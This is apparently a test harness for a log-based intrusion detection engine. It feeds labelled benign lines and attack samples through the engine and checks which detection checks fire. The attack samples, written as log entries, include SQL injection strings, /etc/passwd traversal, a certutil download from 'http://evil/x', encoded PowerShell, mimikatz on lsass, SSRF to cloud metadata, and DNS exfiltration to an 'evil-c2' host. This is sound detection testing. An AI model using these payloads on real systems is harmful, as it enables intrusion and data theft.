// demo.js — handcrafted attack showcase: real-world malicious inputs in mixed
// log formats -> GIE filter -> per-input verdict. Ground truth is known here,
// so every attack MUST defect and every benign line MUST pass.
import { adapt } from './adapters.js';
import { GieEngine } from './engine.js';
import { Baseline } from './baseline.js';
import { buildFrame } from './frame.js';
import { generate } from './genlogs.js';

const BIGBLOB = Array.from({ length: 400 }, (_, i) =>
  'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'[(i * 37 + 11) % 64]
).join('');

const CASES = [
  // [label, line, expected_failed_checks]
  ['BENIGN  access log', '66.2.10.1 - - [13/Sep/2026:03:04:12 +0000] "GET /api/v1/orders?page=2 HTTP/1.1" 200 412 host=api.kvch.internal', []],
  ['SQLi    UNION exfil via access log', '66.2.10.1 - - [13/Sep/2026:03:04:13 +0000] "GET /search?q=%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 88 host=api.kvch.internal', [1]],
  ['SQLi    tautology OR 1=1', '{"t":"db_query","host":"db-1","query":"SELECT * FROM users WHERE name = \'x\' OR 1=1--"}', [1]],
  ['TRAV    ../../../etc/passwd', '66.2.10.1 - - [13/Sep/2026:03:04:14 +0000] "GET /files?name=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 200 88 host=api.kvch.internal', [12]],
  ['CRLF    response split', '{"t":"http_req","host":"edge-1","method":"GET","path":"/r","headers":{"x-ref":"a%0d%0aSet-Cookie:%20s=1"}}', [13]],
  ['EXEC    node -> /bin/sh', '{"evt":"execve","host":"web-1","comm":"node","file":"/bin/sh","args":"-c id"}', [258, 259]],
  ['EXEC    w3wp -> powershell -enc', '{"evt":"execve","host":"web-2","comm":"w3wp.exe","ppid":"w3wp.exe","file":"powershell.exe","args":"-enc SQBFAFgA -nop -w hidden"}', [136, 258, 259, 260]],
  ['EXEC    nginx -> certutil LOLBin', '{"evt":"execve","host":"web-3","comm":"nginx","ppid":"nginx","file":"certutil.exe","args":"-urlcache -split -f http://evil/x"}', [259, 260]],
  ['SYS     kexec_load (not whitelisted)', '{"t":"syscall","host":"db-1","name":"kexec_load","pid":991,"args":"fd=3"}', [257]],
  ['SYS     ptrace on lsass', '{"t":"ptrace","host":"db-1","name":"ptrace","comm":"mimikatz.exe","target":"lsass.exe"}', [265]],
  ['WRITE   /etc/cron.d/shell', '{"t":"file_write","host":"db-1","path":"/etc/cron.d/shell","comm":"apache2"}', [261, 262]],
  ['MEM     AMSI patch', '{"t":"mem_write","host":"w1","target":"amsi.dll!AmsiScanBuffer","comm":"powershell.exe"}', [135]],
  ['MEM     RWX page (W^X)', '{"t":"mem","host":"w1","prot":"RWX","comm":"app","length":4096}', [130]],
  ['EVAL    runtime eval()', '{"t":"runtime","host":"api-1","op":"eval","comm":"node","arg":"require(\\"child_process\\")"}', [142]],
  ['PROTO   __proto__ pollution', '{"t":"runtime","host":"api-1","op":"set","comm":"node","mutates":"__proto__.isAdmin"}', [131]],
  ['NET     SSRF cloud metadata', '{"t":"connect","host":"api-2","comm":"node","daddr":"169.254.169.254","dport":80}', [395]],
  ['NET     SSRF loopback', '{"t":"connect","host":"api-2","comm":"node","daddr":"127.0.0.1","dport":6379}', [395]],
  ['DNS     exfil via long label', 'dns ts=2026-09-13T03:05:01Z src=10.0.0.5 qname=yWJlYmluZyBvZiB0aGUgdGhpZWYgaXMgYW5nZWwgb2YgZW4NcmV0LWtleXM.evil-c2.example qtype=TXT', [390]],
  ['ICMP    oversized payload tunnel', '{"t":"icmp","host":"edge-1","src_ip":"10.0.0.9","payload_len":1400,"seq":12}', [391]],
  ['TUN     raw tunnel on :443 (chisel)', '{"t":"flow","host":"edge-1","saddr":"10.0.0.4","daddr":"185.22.1.9","sport":51122,"dport":443,"proto":"raw","banner":"chisel-v1.7"}', [388, 389]],
  ['OAUTH   authorize w/o PKCE', '{"t":"oauth","host":"auth-1","flow":"authorize","client_id":"web","redirect_uri":"https://app.kvch.local/cb"}', [386]],
  ['OAUTH   nonce replay', '{"t":"oauth","host":"auth-1","flow":"token","key":"acct-7","nonce":"n-0S6_WzA2Mj"}\n{"t":"oauth","host":"auth-1","flow":"token","key":"acct-7","nonce":"n-0S6_WzA2Mj"}', [400]],
  ['OAUTH   evil redirect_uri', '{"t":"oauth","host":"auth-1","flow":"authorize","client_id":"web","redirect_uri":"https://evil.example/cb","code_challenge":"abc","code_challenge_method":"S256"}', [387]],
  ['WS      unmasked client frame', '{"t":"ws","host":"edge-1","masked_ok":false,"opcode":1}', [398]],
  ['CORS    * + credentials', '{"t":"http_resp","host":"edge-1","headers":{"access-control-allow-origin":"*","access-control-allow-credentials":"true"}}', [396]],
  ['GQL     depth-9 introspection bomb', '{"t":"gql","host":"api-1","depth":9,"query":"{a{b{c{d{e{f{g{h{i}}}}}}}}"}', [7]],
  ['UPLOAD  high-entropy blob', JSON.stringify({ t: 'upload', host: 'api-1', blob: BIGBLOB + 'AE9=' }), [16]],
  ['BENIGN  DNS lookup', 'dns ts=2026-09-13T03:05:02Z src=10.0.0.6 qname=api.kvch.internal qtype=A', []],
  ['BENIGN  benign syscall', '{"t":"syscall","host":"db-1","name":"openat","pid":555,"args":"fd=3"}', []],
];

const base = new Baseline();
generate(200, { rate: 0, seed: 7 }).templates.forEach((t) => base.learn(t));
const eng = new GieEngine({ baseline: base });

let pass = 0, fail = 0;
for (const [label, line, expected] of CASES) {
  const lines = line.split('\n');
  let lastFrame = null;
  const fired = new Set();
  lines.forEach((l, j) => {
    const evt = adapt(l, `demo:${label}:${j}`);
    const r = eng.evaluate(evt);
    if (r.isDefect) {
      r.failed.forEach((c) => fired.add(c.id));
      lastFrame = buildFrame(evt, r.tensor, r.failed);
    }
  });
  const got = [...fired].sort((a, b) => a - b);
  const allExpected = expected.every((id) => fired.has(id));
  const isAttack = expected.length > 0;
  const ok = isAttack ? (lastFrame !== null && allExpected) : lastFrame === null;
  ok ? pass++ : fail++;
  const status = ok ? (isAttack ? 'BLOCKED' : 'pass   ') : '!!FAIL!';
  console.log(`${status}  ${label}`);
  if (isAttack) {
    console.log(`         checks: ${got.map((id) => `#${id}`).join(' ') || '(none)'}  verdict: ${lastFrame ? lastFrame.verdict : 'PASSED — slipped through'}`);
    if (!allExpected) console.log(`         !! expected ${expected.join(',')} missing`);
  }
}
console.log(`\n${pass}/${CASES.length} cases correct, ${fail} wrong`);
process.exit(fail ? 1 : 0);
